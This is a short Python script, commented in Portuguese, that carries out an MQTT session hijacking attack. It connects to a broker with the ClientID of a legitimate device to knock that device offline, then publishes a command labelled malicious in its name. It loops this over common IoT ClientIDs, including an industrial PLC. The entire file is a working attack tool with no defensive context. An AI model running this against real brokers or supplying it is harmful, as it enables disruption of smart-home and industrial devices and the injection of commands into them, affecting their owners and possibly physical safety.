#!/usr/bin/env python3
import paho.mqtt.client as mqtt
import time

def hijack_session(broker, target_client_id):
    print(f"[!] Attempting to hijack session: {target_client_id}")
    
    # Cliente com MESMO ClientID - força desconexão do legítimo
    attacker = mqtt.Client(client_id=target_client_id, clean_session=False)
    attacker.connect(broker, 1883, 60)
    
    # Publica comandos maliciosos como se fosse o dispositivo legítimo
    attacker.publish("hijacked/commands", '{"cmd":"malicious_action"}', qos=2)
    
    print(f"[✓] Session hijacked: {target_client_id}")
    time.sleep(5)
    attacker.disconnect()

if __name__ == "__main__":
    import sys
    broker = sys.argv[1] if len(sys.argv) > 1 else "localhost"
    
    # ClientIDs comuns de dispositivos IoT
    common_client_ids = [
        "ESP32_Device_01",
        "RaspberryPi_Gateway",
        "Arduino_Sensor_Main",
        "SmartHome_Controller",
        "Industrial_PLC_01"
    ]
    
    for client_id in common_client_ids:
        hijack_session(broker, client_id)
        time.sleep(2)
    
    print("[✓] Session hijacking attack completed")